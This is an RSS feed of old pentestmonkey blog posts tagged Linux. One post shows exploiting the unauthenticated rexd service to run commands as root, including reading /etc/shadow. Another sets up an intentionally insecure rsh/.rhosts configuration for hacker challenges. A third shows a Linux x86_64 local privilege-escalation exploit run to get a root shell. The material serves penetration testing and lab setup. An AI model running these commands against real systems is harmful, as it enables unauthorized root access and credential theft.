<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>linux &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/linux/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Thu, 10 Nov 2011 21:37:09 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Bootparamd Client for Linux</title>
		<link>https://pentestmonkey.net/tools/misc/bootparamd-client-for-linux</link>
					<comments>https://pentestmonkey.net/tools/misc/bootparamd-client-for-linux#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 02 Nov 2008 21:11:50 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[bootparamd]]></category>
		<category><![CDATA[linux]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=117</guid>

					<description><![CDATA[See this blog post for download link and installation instructions.]]></description>
										<content:encoded><![CDATA[<p>See this <a href="http://pentestmonkey.net/blog/nis-domain-name/">blog post</a> for download link and installation instructions.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/misc/bootparamd-client-for-linux/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Rexd Client For Linux</title>
		<link>https://pentestmonkey.net/tools/misc/rexd-client-for-linux-2</link>
					<comments>https://pentestmonkey.net/tools/misc/rexd-client-for-linux-2#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 01 Nov 2008 12:56:53 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[linux]]></category>
		<category><![CDATA[rexd]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=116</guid>

					<description><![CDATA[Full details about &#8220;on&#8221;, the rexd client can be found on this blog post.]]></description>
										<content:encoded><![CDATA[<p>Full details about &#8220;on&#8221;, the rexd client can be found on this <a href="http://pentestmonkey.net/blog/rexd-client-for-linux/">blog post</a>.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/misc/rexd-client-for-linux-2/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Rexd Client For Linux</title>
		<link>https://pentestmonkey.net/blog/rexd-client-for-linux</link>
					<comments>https://pentestmonkey.net/blog/rexd-client-for-linux#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Thu, 23 Oct 2008 22:24:23 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[linux]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[rexd]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=70</guid>

					<description><![CDATA[I recently encountered the rexd service running on a host I was testing.  This is a really old-school UNIX service which you don&#8217;t see much on modern networks (in my experience at least).  It&#8217;s well know that it&#8217;s insecure: It basically lets you run any command on the host as any user you like with [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I recently encountered the <a href="http://docs.sun.com/app/docs/doc/816-5212/6mbcdgk7r?a=view">rexd</a> service running on a host I was testing.  This is a really old-school UNIX service which you don&#8217;t see much on modern networks (in my experience at least).  It&#8217;s <a href="http://www.porcupine.org/satan/demo/tutorials/vulnerability/REXD_access.html">well know</a> that it&#8217;s insecure: It basically lets you run any command on the host as any user you like with no authentication.</p>
<p>This post briefly covers how to identify the service and how to exploit it.  I&#8217;ve also modified the rexd client from SATAN to compile cleanly on Linux (download link below&#8230;).</p>
<p>&nbsp;</p>
<p><span id="more-70"></span></p>
<h3>Identifying Hosts Running Rexd</h3>
<p>Use rpcinfo to check the RPC service running on the target host (assuming the portmapper is running &#8211; 111/TCP).  If rexd is listed, you&#8217;re in luck:</p>
<pre>$ rpcinfo -p 10.0.0.1
   program vers proto   port                               
    100000    4   tcp    111  rpcbind                      
    100000    3   tcp    111  rpcbind                      
    100000    2   tcp    111  rpcbind                      
    100000    4   udp    111  rpcbind                      
    100000    3   udp    111  rpcbind                      
    100000    2   udp    111  rpcbind                      
    100229    1   tcp  32795  metad                        
    100229    2   tcp  32795  metad                        
    100230    1   tcp  32796  metamhd                      
    100242    1   tcp  32797  rpc.metamedd                 
    100017    1   tcp  32798  rexd                   &lt;---   :-)
...</pre>
<h3>Exploitation</h3>
<p>Exploitation is a simple as finding a client and running it.  Solaris hosts usually have the client &#8220;on&#8221; installed by default.  If you&#8217;ve got a Solaris VM, or you&#8217;ve already broken into another Solaris machine during your pentest, you can probably use that.</p>
<p>Alternatively, if you&#8217;d prefer a Linux client, it seems you&#8217;re out of luck.  Modern distros don&#8217;t seem to have such a client (I checked Gentoo and Debian).  SATAN (an old-school pentesting toolkit) has one which I modified to compile cleanly and be a bit easier to use.  <a href="http://www.pentestmonkey.net/tools/on/on.tar.gz">Download my modified rexd client here</a>.</p>
<p><em>Update: 2011-11 Thanks to Hank Leininger for the patch. Now supports -p arg.</em></p>
<p>To compile / install:</p>
<pre>$ tar xfz on.tar.gz
$ cd on
$ make
$ sudo make install</pre>
<p>Help message:</p>
<pre>$ on
Usage: on [ -u uid ] [ -g gid ] [ -h hostname ] ip command...
Examples:
    on 10.0.0.1 cat /etc/shadow
    on 10.0.0.1 -u 1 10.0.0.1 id

on is a client for rexd, the Remote Execution Daemon.  To check if a target
is running rexd, do 'rpcinfo -p ip' and check for rexd (program number 100017).

If rexd is running on the target you should be able to execute commands on the
remote host as any user you like.

This program is a minor modification of 'rex' by Wietse Venema, part of SATAN:
http://www.porcupine.org/satan/mirrors.html</pre>
<p>To run:</p>
<pre>$ on 10.0.0.1 id
uid=0(root) gid=0(root)
$ on -u 1 -g 2 10.0.0.1 id
uid=1(daemon) gid=2(bin)
$ on 10.0.0.1 cat /etc/shadow
root:.VLpoFoQoa8eY:14175::::::
daemon:NP:6445::::::
bin:NP:6445::::::
...</pre>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/rexd-client-for-linux/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Getting RSH on Linux to work like RSH on Solaris</title>
		<link>https://pentestmonkey.net/blog/rsh-rlogin-config-linux</link>
					<comments>https://pentestmonkey.net/blog/rsh-rlogin-config-linux#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Fri, 11 Jan 2008 20:49:08 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[linux]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[rsh]]></category>
		<category><![CDATA[solaris]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=32</guid>

					<description><![CDATA[If you&#8217;ve tried setting up rsh/rlogin based hacker challenges on Linux over the last few years you&#8217;ve probably noticed that Linux (I tried Redhat and Debian) doesn&#8217;t behave like Solaris.  This makes either for really bad hacker challenges, or for ones involving lots of Solaris boxes. I finally found the answer recently so thought I&#8217;d [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>If you&#8217;ve tried setting up rsh/rlogin based hacker challenges on Linux over the last few years you&#8217;ve probably noticed that Linux (I tried Redhat and Debian) doesn&#8217;t behave like Solaris.  This makes either for really bad hacker challenges, or for ones involving lots of Solaris boxes.</p>
<p>I finally found the answer recently so thought I&#8217;d post the answer incase it helps anyone else afflicted by this puzzle.</p>
<p><span id="more-32"></span></p>
<h3>The Problem</h3>
<p>If you set up a server (say 10.0.0.1) and create a user (ptm) with an insecure .rhosts file (&#8220;+ +&#8221;) you find that you can&#8217;t abuse this account as planned:</p>
<pre>$ rsh -l ptm 10.0.0.1 id
Permission denied.</pre>
<pre>$ rlogin -l ptm 10.0.0.1
Password:</pre>
<p>This is not how it works on Solaris, and it&#8217;s probably not what you want for your hacker challenge.  + is supposed to be a wild card.  The first + in the .rhosts file means any source IP can log in.  The second + means that any source username can log in.</p>
<p>You&#8217;ll find entries like the following in /var/log/auth.log:</p>
<pre>Jan 11 20:17:47 debian pam_rhosts_auth[3423]: denied to foo@10.0.0.1 as ptm: access not allowed
Jan 11 20:17:47 debian in.rshd[3423]: rsh denied to foo@192.168.20.1 as ptm: Permission denied</pre>
<p>There&#8217;s the clue, then.  PAM is unhappy and has denied our login attempt.</p>
<h3>The Solution</h3>
<p>I found <a href="http://forums.fedoraforum.org/archive/index.php/t-57722.html">this post</a> by Nalin Dahyabhai who notes that you simply need to pass the&#8221;promiscuous&#8221; option to pam_rhosts_auth.so:</p>
<pre>debian:/etc/pam.d# cat rsh
auth    required        pam_nologin.so
auth    required        pam_env.so
auth    required        pam_rhosts_auth.so promiscuous
account required        pam_unix_acct.so
session required        pam_unix_session.so</pre>
<p>You should also do this for /etc/pam.d/rlogin.</p>
<p>RSH and RLogin will then work like Solaris, e.g. if user ptm has an entry like the following in ~/.rhosts:</p>
<pre>+ +</pre>
<p>The following commands now work:</p>
<pre>$ rsh -l ptm 10.0.0.1 id</pre>
<pre>$ rlogin -l ptm 10.0.0.1</pre>
<p>&nbsp;</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/rsh-rlogin-config-linux/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Linux Local Privilege Escalation for x86_64</title>
		<link>https://pentestmonkey.net/blog/linux-64-privesc</link>
					<comments>https://pentestmonkey.net/blog/linux-64-privesc#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Fri, 28 Sep 2007 23:03:59 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[linux]]></category>
		<category><![CDATA[pentest]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=22</guid>

					<description><![CDATA[Wojciech Purczynski found an interesting vulnerability which allows non-priv users on Linux x86_64 systems to escalate privileges to root: user@linux64 /tmp $ uname -a Linux ws 2.6.22-gentoo-r5 #1 SMP Mon Sep 24 00:24:36 BST 2007 x86_64 Intel(R) Core(TM)2 Quad CPU Q6600 @ 2.40GHz GenuineIntel GNU/Linux user@linux64 /tmp $ gcc -o 4460 4460.c user@linux64 /tmp $ [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Wojciech Purczynski found an <a href="http://www.milw0rm.com/exploits/4460">interesting vulnerability</a> which allows non-priv users on Linux x86_64 systems to escalate privileges to root:</p>
<pre>user@linux64 /tmp $ uname -a Linux ws 2.6.22-gentoo-r5 #1 SMP Mon Sep 24 00:24:36 BST 2007 x86_64 Intel(R) Core(TM)2 Quad CPU Q6600 @ 2.40GHz GenuineIntel GNU/Linux</pre>
<pre>user@linux64 /tmp $ gcc -o 4460 4460.c</pre>
<pre>user@linux64 /tmp $ ./4460</pre>
<pre>UID 0, EUID:0 GID:70, EGID:70</pre>
<pre>sh-3.2# id</pre>
<pre>uid=0(root) gid=99(user) groups=99(user)</pre>
<pre></pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/linux-64-privesc/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
